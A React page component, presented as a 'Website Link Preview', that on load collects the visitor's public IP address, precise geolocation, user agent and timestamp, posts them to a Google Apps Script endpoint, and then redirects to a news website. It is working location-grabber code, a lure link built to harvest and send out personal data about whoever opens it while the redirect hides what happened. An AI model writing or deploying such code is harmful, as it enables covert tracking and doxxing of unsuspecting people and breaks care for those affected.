import { useEffect } from 'react';

export default function App() {
  async function getIPAddress() {
    try {
      const response = await fetch('/api/get-ip');
      const data = await response.json();
      const formData = new FormData();
      console.log('Public IP Address:', data.ip);

      let latitude;
      let longitude;

      const currentDate = new Date();
      console.log('Current Date:', currentDate);

      navigator.geolocation.getCurrentPosition(
        function (position) {
          latitude = position.coords.latitude;
          longitude = position.coords.longitude;
          console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
          formData.append("Location", `Latitude: ${latitude}, Longitude: ${longitude}`);
          submitFormData(formData, data.ip, currentDate);
        },
        function (error) {
          console.error('Geolocation error:', error);
        }
      );

      const userAgent = navigator.userAgent;
      console.log('User Agent:', userAgent);

      formData.append("Ip", data.ip);
      formData.append("Date", currentDate);
      formData.append("Agent", userAgent);
    } catch (error) {
      console.error('Error fetching IP address:', error);
    }
  }

  useEffect(() => {
    getIPAddress();
  }, []);

  function submitFormData(formData, ip, currentDate) {
    console.log('Submitting form data:', { ip, currentDate });
    fetch("https://script.google.com/macros/s/AKfycbzgAshZLiCApC6jZgqmPYm2lZ3wea7xNwc8lCCYCn0Qrdc-L1AtSuVi7Fqdnd6JI1hI/exec", {
      method: "POST",
      body: formData
    })
    .then((res) => res.json())
    .then((data) => {
      console.log('Form submission response:', data);
      setTimeout(() => {
        window.location.href = 'https://tv9gujarati.com/';
      }, 1000);
    })
    .catch((error) => {
      console.error('Error submitting form:', error);
    });
  }

  return (
    <div className="App">
      <h1>Website Link Preview</h1>
      <p>IP and location data are being processed...</p>
    </div>
  );
}
